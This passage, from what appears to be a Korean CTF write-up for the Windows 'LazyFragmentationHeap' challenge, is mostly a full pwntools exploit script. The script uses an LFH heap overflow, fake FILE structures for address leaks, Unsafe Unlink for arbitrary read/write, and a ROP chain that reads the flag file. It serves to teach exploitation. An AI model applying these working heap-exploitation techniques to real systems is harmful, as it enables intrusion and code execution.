	elif cursor == 0:
		# default target is ntdll on _HEAP->LockVariable->Lock
		cursor = heap_base + 0x2c0
		
	# log.info("&_HEAP = 0x%016x" % heap_base)

	# make LFH to allocate new UserBlock in chunk 4
	for _ in range(0x14):
		open_file()

	fake_HEAP_USERDATA_HEADER = ""
	fake_HEAP_USERDATA_HEADER += p64(heap_base + 0xbcd0)   # +0x000 SubSegment
	fake_HEAP_USERDATA_HEADER += p64(heap_base + 0x12e40)  # +0x008 Reserved
	fake_HEAP_USERDATA_HEADER += p32(0xc)                  # +0x010 SizeIndexAndPadding
	fake_HEAP_USERDATA_HEADER += p32(0xf0e0d0c0)           # +0x014 Signature
	fake_HEAP_USERDATA_HEADER += p64(0) * 5                # I couldn't leak other values

	fake_FILE = ""
	fake_FILE += p64(0) * 2              # _HEAP_ENTRY
	fake_FILE += p64(cursor)             # cursor of SEEK_CUR
	fake_FILE += p64(cursor & ~0xfff)    # base address
	fake_FILE += p32(0x800)              # remaining file size
	fake_FILE += p32(0x2041)             # I dunno what they are
	fake_FILE += p64(0x17)				
	fake_FILE += p64(0x1000)
	fake_FILE += p64(0)
	fake_FILE += p64(0xffffffffffffffff)
	fake_FILE += p64(0xffffffff)
	fake_FILE += p64(0)
	fake_FILE += p64(0)

	for_leak = ""
	for_leak += fake_HEAP_USERDATA_HEADER
	for_leak += fake_FILE * (0x1000 / len(fake_FILE))

	edit(4, for_leak)
	alloc(5, SIZE)
	if leakLazy:
		read_file(5,4)
		result = u64(show(5)[:4].ljust(8, p8(0))) << 16
	else:
		read_file(5,8)
		result = u64(show(5)[:8].ljust(8, p8(0)))

	if disconn:
		sla("Your choice: ", str(6))
		hi.close()

	context.log_level = "info"
	return result

lazy_base = leak(leakLazy=True)
log.info("LazyFragmentationHeap = 0x%016x" % lazy_base)

kernel32 = leak(lazy_base+0x3008) - 0x1e690  # KERNEL32!IsDebuggerPresentStub
ntdll    = leak(lazy_base+0x3010) - 0x73810  # ntdll!RtlInitializeSListHead
ucrtbase = leak(lazy_base+0x30b0) - 0x0f760  # ucrtbase!free

log.info("kernel32 = 0x%016x" % kernel32)
log.info("ntdll    = 0x%016x" % ntdll)
log.info("ucrtbase = 0x%016x" % ucrtbase)

'''
[*] LazyFragmentationHeap = 0x00007ff76f400000
[*] kernel32 = 0x00007ffd09140000
[*] ntdll    = 0x00007ffd09b00000
[*] ucrtbase = 0x00007ffd075e0000
'''
```

필요한 모듈주소를 모두 leak 했으니 이제 마지막 익스플로잇 단계만 남았습니다.

공격기법은 [3.10. Allocate/Free Non-LFH chunk](#310-Allocate/Free-Non-LFH-chunk)에서 언급한대로 Unsafe Unlink 기법을 이용해 R/W primitive를 만들어서 ROP를 해야하는데, 이후의 부분은 LFH보단 일반적인 Heap Feng-Shui에 가깝기 때문에 설명은 코드에 달린 주석으로 생략할려고 합니다.

근데 이거저거 재밌는게 많아서 이부분은 직접 한번 해보시는걸 추천해드립니다!

```python
from pwn import *

# context.log_level = "debug"

# HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
HOST = "192.168.0.18" # VirtualBox Bridge 
PORT = 6677
SIZE = 0xC8 # yes, I intend korean slang

hi = None
sla = None

def alloc(chunk_id, size):
    sla("Your choice: ", str(1))
    sla("Size:", str(size))
    sla("ID:", str(chunk_id))

def edit(chunk_id, val, need_newline=True):
    sla("Your choice: ", str(2))
    sla("ID:", str(chunk_id))
    if need_newline:
        sla("Content:", val)
    else:
        hi.sendafter("Content:", val)

def show(chunk_id):
    sla("Your choice: ", str(3))
    sla("ID:", str(chunk_id))
    return hi.recvline().strip()[9:]

def free(chunk_id):
    sla("Your choice: ", str(4))
    sla("ID:", str(chunk_id))

def open_file():
    sla("Your choice: ", str(5))
    sla("Your choice: ", str(1))
    sla("Your choice: ", str(3))

def read_file(chunk_id, size, go_back=True):
    sla("Your choice: ", str(5))
    sla("Your choice: ", str(2))
    sla("ID:", str(chunk_id))
    sla("Size:", str(size))
    if go_back:
        sla("Your choice: ", str(3))


def persistent_leak(cursor=0, disconn=True, leakLazy=False):
    global hi, sla
    context.log_level = "error"
    hi = remote(HOST, PORT)
    sla = hi.sendlineafter

    alloc(1, SIZE)
    edit(1, "A" * SIZE)
    try:
        heap_encod = u64(show(1)[SIZE:] + "\x00\x10") ^ 0x1000000d02010003
    except struct.error:
        log.info("_HEAP_ENTRY not leaked")
        return

    # log.info("_HEAP->Encoding = 0x%016x" % heap_encod)

    alloc(2, 0x268)
    alloc(3, 0x200)
    fake_entry = 0x10000027c80101c8 ^ heap_encod
    '''
    0x10000027c80101c8
       +0x008 Size             : 0x1c8
       +0x00a Flags            : 0x1 ''
       +0x00b SmallTagIndex    : 0xc8 ''
       +0x008 SubSegmentCode   : 0xc80101c8
       +0x00c PreviousSize     : 0x27
       +0x00e SegmentOffset    : 0 ''
       +0x00e LFHFlags         : 0 ''
       +0x00f UnusedBytes      : 0x10 ''
    '''

    # log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)

    alloc(4, 0x1c80 -  # fake chunk size 
             0x20   -  # sizeof(_HEAP_ENTRY) * 2
             0x200     # orginal size of overwritten chunk
    ) 
    open_file()
    read_file(2, 0x268)
    edit(2, "A" * 0x268 + p64(fake_entry)[:6], False)
    free(3)         # free coalesce mechanism also free'ing chunk 4
    alloc(3, 0x200) # set Flink and Blink at chunk 4

    heap_base = u64(show(4)[:8].ljust(8, p8(0))) - 0x150
    if heap_base == 0:
        log.info("Heap address not leaked")
        return

    if leakLazy:
        cursor = heap_base + 0x27b2 # can't leak null-byte
    elif cursor == 0:
        # default target is ntdll on _HEAP->LockVariable->Lock
        cursor = heap_base + 0x2c0
        
    # log.info("&_HEAP = 0x%016x" % heap_base)

    # make LFH to allocate new Userblock in chunk 4
    for _ in range(0x14):
        open_file()

    fake_HEAP_USERDATA_HEADER = ""
    fake_HEAP_USERDATA_HEADER += p64(heap_base + 0xbcd0)   # +0x000 SubSegment
    fake_HEAP_USERDATA_HEADER += p64(heap_base + 0x12e40)  # +0x008 Reserved
    fake_HEAP_USERDATA_HEADER += p32(0xc)                  # +0x010 SizeIndexAndPadding
    fake_HEAP_USERDATA_HEADER += p32(0xf0e0d0c0)           # +0x014 Signature
    fake_HEAP_USERDATA_HEADER += p64(0) * 5                # I couldn't leak other values

    fake_FILE = ""
    fake_FILE += p64(0) * 2              # _HEAP_ENTRY
    fake_FILE += p64(cursor)             # cursor of SEEK_CUR
    fake_FILE += p64(cursor & ~0xfff)    # base address
    fake_FILE += p32(0x800)              # remaining file size
    fake_FILE += p32(0x2041)             # I dunno what they are
    fake_FILE += p64(0x17)                
    fake_FILE += p64(0x1000)
    fake_FILE += p64(0)
    fake_FILE += p64(0xffffffffffffffff)
    fake_FILE += p64(0xffffffff)
    fake_FILE += p64(0)
    fake_FILE += p64(0)

    for_leak = ""
    for_leak += fake_HEAP_USERDATA_HEADER
    for_leak += fake_FILE * (0x1000 / len(fake_FILE))

    edit(4, for_leak)
    alloc(5, SIZE)
    if leakLazy:
        read_file(5,4)
        result = u64(show(5)[:4].ljust(8, p8(0))) << 16
    else:
        read_file(5,8)
        result = u64(show(5)[:8].ljust(8, p8(0)))

    if disconn:
        sla("Your choice: ", str(6))
        hi.close()

    context.log_level = "info"
    return result


magic_switch = True
def exploit():
    global hi, sla
    hi = remote(HOST, PORT)
    sla = hi.sendlineafter

    alloc(1, SIZE)
    edit(1, "A" * SIZE)
    try:
        heap_encod = u64(show(1)[SIZE:] + "\x00\x10") ^ 0x1000000d02010003
    except struct.error:
        log.info("_HEAP_ENTRY not leaked")
        return

    alloc(2, 0x268)
    alloc(3, 0x200)
    fake_entry = 0x10000027c80101c8 ^ heap_encod
    '''
    0x10000027c80101c8
       +0x008 Size             : 0x1c8
       +0x00a Flags            : 0x1 ''
       +0x00b SmallTagIndex    : 0xc8 ''
       +0x008 SubSegmentCode   : 0xc80101c8
       +0x00c PreviousSize     : 0x27
       +0x00e SegmentOffset    : 0 ''
       +0x00e LFHFlags         : 0 ''
       +0x00f UnusedBytes      : 0x10 ''
    '''

    alloc(4, 0x1000) # big chunk for LFH's new UserBlock

    # pre-setting for Unsafe Unlink
    # (0x1c80 - 0x40 - 0x200 - 0x1000)/2 = 0x520
    alloc(5, 0x520) 

    # this is chunk 6
    # set chunk_id to _HEP_ENTRY for Heap Feng-Shui
    alloc(0x5353000053 ^ heap_encod, 0x520)

    open_file()
    read_file(2, 0x268)
    edit(2, "A" * 0x268 + p64(fake_entry)[:6], False)
    free(3)         # free coalesce mechanism also free'ing chunk 4, 5, 6
    alloc(3, 0x200) # set Flink and Blink at chunk 4, 5, 6

    heap_base = u64(show(4)[:8].ljust(8, p8(0))) - 0x150
    if heap_base == 0:
        log.info("Heap address not leaked")
        return

    # make LFH to allocate new Userblock in chunk 4
    for _ in range(0x14):
        open_file()

    fake_HEAP_USERDATA_HEADER = ""
    fake_HEAP_USERDATA_HEADER += p64(heap_base + 0xbcd0)    # +0x000 SubSegment
    fake_HEAP_USERDATA_HEADER += p64(heap_base + 0x12e40)   # +0x008 Reserved
    fake_HEAP_USERDATA_HEADER += p32(0xc)                   # +0x010 SizeIndexAndPadding
    fake_HEAP_USERDATA_HEADER += p32(0xf0e0d0c0)            # +0x014 Signature
    fake_HEAP_USERDATA_HEADER += p64(0) * 5                 # I couldn't leak other values

    # cursor points heap_mem of chunk 3
    cursor = 0xbeefdad0000 + (0x28 * 2) + 0x20

    # HAVE TO set specific values to get input from STDIN
    fake_FILE = ""
    fake_FILE += p64(0) * 2              # _HEAP_ENTRY
    fake_FILE += p64(cursor)             # cursor of SEEK_CUR <--|
    fake_FILE += p64(cursor)             # base address <--------|-- both must be equal
    fake_FILE += p32(0)                  # remaining file size
    fake_FILE += p32(0x2041)             # I dunno what they are
    fake_FILE += p64(0x1)                # <------------------------ only 0 or 1 or 2
    fake_FILE += p64(0x800)
    fake_FILE += p64(0)
    fake_FILE += p64(0xffffffffffffffff)
    fake_FILE += p64(0xffffffff)
    fake_FILE += p64(0)
    fake_FILE += p64(0)

    for_leak = ""
    for_leak += fake_HEAP_USERDATA_HEADER
    for_leak += fake_FILE * ((0x1000-len(for_leak)) / len(fake_FILE))

    edit(4, for_leak, False)
    read_file(3, 8, False)

    # ucrtbase!_pioinfo[0] has fixed heap offset
    hi.send(p64(heap_base+0x8d48)) # I dunno any details about windows FSOP...V_V
    sla("Your choice: ", str(3))   # But @scwuaptx said offset 0x38 is flag
    edit(3, p8(9), False)          # this will switch text mode to binary mode

    fxxk = 0xbeefdad0000 + (0x28 * 5) + 0x20 # heap_mem of chunk 6 

    alloc(7, (0x520*2) + 0x10) # sizeof(chunk 5 and 6) + sizeof(_HEAP_ENTRY)
                               # have same heap_mem with chunk 5
    free(5)                    # Actually it free'ing chunk 7
    alloc(5, 0x520)            # Now, chunk 7 === chunk 5

    # But chunk 7 is bigger than chunk 5
    edit(7, "A" * 0x520 + 
            p64(0) + 
            p64(0x5353000053 ^ heap_encod) + 
            p64(fxxk - 8) + # Flink->Blink = Flink
            p64(fxxk)       # Blink->Flink = Blink
                            # satisfying unlink condition
                            # *(fxxk) = fxxk
    )
    alloc(8, 0x520)
    
    lazy_id1 = 0xdeadbeef 
    lazy_id2 = 0xcafebabe
    lazy_id3 = 0x13371337
    create_lazy_header = lambda chunk_id : flat([
                                               0xddaabeef1acd, 
                                               0x200,
                                               chunk_id,
                                               0xddaabeef1acd, 
                                           ], word_size=64, endianness="little")

    lazy_header1 = create_lazy_header(lazy_id1)
    lazy_header2 = create_lazy_header(lazy_id2)
    lazy_header3 = create_lazy_header(lazy_id3)

    edit(0x5353000053 ^ heap_encod, p64(0xbeefdad0000) + 
                                    lazy_header1 + 
                                    p64(0xbeefdad0000)
    )

    # set lazy_header1 at 0xbeefdad0000
    edit(lazy_id1, lazy_header1 + p64(0xbeefdad0000)) 

    # Becuase of edit limit at "2. Edit File content",
    # HAVE TO keep modifying magic1
    def lazy_read(addr):
        global magic_switch

        if magic_switch:
            edit(lazy_id1, lazy_header1 + 
                           p64(addr) +
                           lazy_header2 +
                           p64(0xbeefdad0000)
            )
            result = show(lazy_id1)
        else:
            edit(lazy_id2, lazy_header1 + 
                           p64(0xbeefdad0000) +
                           lazy_header2 +
                           p64(addr)
            )
            result = show(lazy_id2)

        magic_switch = not magic_switch
        return result

    def lazy_write(addr, value):
        global magic_switch

        if magic_switch:
            edit(lazy_id1, lazy_header1 + 
                           p64(addr) +
                           lazy_header2 +
                           p64(0xbeefdad0000) +
                           lazy_header3 +
                           p64(addr)
            )
        else:
            edit(lazy_id2, lazy_header1 + 
                           p64(0xbeefdad0000) +
                           lazy_header2 +
                           p64(addr) +
                           lazy_header3 +
                           p64(addr)
            )

        edit(lazy_id3, value, False)
        magic_switch = not magic_switch

    # ntdll!TlsBitMap+0x8 == _PEB->TlsBitmap
    _PEB = u64(lazy_read(ntdll+0x165348).ljust(8, p8(0))) - 0x80 
    _TEB = _PEB + 0x1000 

    log.info("&_PEB = 0x%016x" % _PEB)
    log.info("&_TEB = 0x%016x" % _TEB)

    # leak _TEB->NtTib->StackBase
    stack_base = u64(lazy_read(_TEB + 8 + 2).ljust(8, p8(0))) << 16
    log.info("_TEB->NtTib->StackBase = 0x%016x" % stack_base)
   
    # find return address of main() at beginning
    main_ret = lazy_base + 0x1b78

    find_ret_addr = hi.progress("finding return address on stack")
    for offset in range(8, 0x1000, 8):
        stack_addr = stack_base - offset
        stack_leak = u64(lazy_read(stack_addr).ljust(8, p8(0)))

        if stack_leak == main_ret:
            find_ret_addr.success("gotcha!")
            break

    # return addres of read() at lazyfragmentationheap+0x14bb
    stack_addr = stack_addr - 0x80
    log.info("stack addr = 0x%016x" % stack_addr)

    flag_addr = lazy_base + 0x50c0
    flag_buf = lazy_base + 0x50d0
    lazy_write(flag_addr, "flag.txt\x00")

    # restore Heap for WINAPI internal usage
    HeapCreate_addr   = kernel32 + 0x1e500 # IAT to KERNELBASE!HeapCreate

    # https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/crt-alphabetical-function-reference
    # ucrtbase.dll contains POSIX functions like open(), read(), write()...
    open_addr  = ucrtbase + 0xa1ae0
    read_addr  = ucrtbase + 0x16140
    write_addr = ucrtbase + 0x14b30
    exit_addr  = ucrtbase + 0x1b8c0

    pop_rcx_ret = ntdll + 0x21527
    pop_rdx_ret = ucrtbase + 0xa9eb2
    pop_r8_ret  = ntdll + 0x4d6cf
    store_rdx_rax_ret = ntdll + 0x88f5c
    store_rcx_plus8_rax_ret = ucrtbase + 0x4a721
    add_rsp_0x28_ret = ntdll + 0x63c5

    process_heap = _PEB + 0x30    # _PEB->ProcessHeap
    crt_heap = ucrtbase + 0xeb570 # ucrtbase!_acrt_heap

    rop_chain = flat([
        pop_rcx_ret,
        0,
        pop_rdx_ret,
        0,
        pop_r8_ret,
        0,
        HeapCreate_addr,   # rax = HeapCreate(0, 0, 0)

        pop_rdx_ret, 
        process_heap,
        store_rdx_rax_ret, # *process_heap = rax

        pop_rdx_ret, 
        crt_heap,
        store_rdx_rax_ret, # *crt_heap = rax

        # rax = open("flag.txt", _O_RDONLY, _S_IREAD)
        pop_rcx_ret,
        flag_addr,
        pop_rdx_ret,
        0,
        pop_r8_ret,
        0x100,
        open_addr,
        add_rsp_0x28_ret,
        0, 0, 0, 0, 0,

        # read(rax, flag_buf, 0x80)
        pop_rcx_ret,
        stack_addr + (8 * 29),
        store_rcx_plus8_rax_ret,
        pop_rcx_ret,
        0x12345678, # will replace to fd
        pop_rdx_ret, 
        flag_buf,
        pop_r8_ret,
        0x80,
        read_addr,
        add_rsp_0x28_ret,
        0, 0, 0, 0, 0,

        # write(1, flag_buf, 0x80)
        pop_rcx_ret,
        1,
        pop_rdx_ret,
        flag_buf,
        pop_r8_ret,
        0x80,
        write_addr,
        add_rsp_0x28_ret,
        0, 0, 0, 0, 0,

        # exit(0)
        pop_rcx_ret,
        0,
        exit_addr
    ], word_size=64, endianness="little")

    lazy_write(stack_addr, rop_chain)
    hi.interactive(prompt=None)


# I DON'T WANT TO SEE FXXKING ERROR
is_leaked = log.progress("This is gonna takes some time...")
while True:
    try:
        lazy_base = persistent_leak(leakLazy=True)
        kernel32 = persistent_leak(lazy_base+0x3008) - 0x1e690  # KERNEL32!IsDebuggerPresentStub
        ntdll    = persistent_leak(lazy_base+0x3010) - 0x73810  # ntdll!RtlInitializeSListHead
        ucrtbase = persistent_leak(lazy_base+0x30b0) - 0x0f760  # ucrtbase!free
        break
    except Exception:
        continue

is_leaked.success("Done :D")
log.info("LazyFragmentationHeap = 0x%016x" % lazy_base)
log.info("kernel32 = 0x%016x" % kernel32)
log.info("ntdll    = 0x%016x" % ntdll)
log.info("ucrtbase = 0x%016x" % ucrtbase)

exploit()
```
![flag result](/assets/images/lazyfragmentationheap-pic9.png)


# 5. 후기
![burnout](/assets/images/lazyfragmentationheap-pic10.jpg)

하얗게 불태워버렸습니다...


# 6. 참고자료

Low-fragmentation Heap
- https://docs.microsoft.com/en-us/windows/win32/memory/low-fragmentation-heap

Windows 8 Heap Internals
- http://illmatics.com/Windows%208%20Heap%20Internals.pdf
- http://illmatics.com/Windows%208%20Heap%20Internals%20(Slides).pdf

Windows 10 Nt Heap Exploitation (English version)
- https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version

windbg와 Win32 API로 알아보는 Windows Heap 정보 분석
- https://www.sysnet.pe.kr/2/0/12068

Low Fragmentation Heap (LFH) Exploitation - Windows 10 Userspace
- https://github.com/peleghd/Windows-10-Exploitation/blob/master/Low_Fragmentation_Heap_(LFH)\_Exploitation_-_Windows_10_Userspace_by_Saar_Amar.pdf

Understanding the Windows Allocator: A Redux
- https://www.leviathansecurity.com/blog/understanding-the-windows-allocator-a-redux

Heap Overflow Exploitation on Windows 10 Explained
- https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/

Windows Debugging( Written in Chinese )
- https://github.com/thawk/wiki/wiki/windows_debug
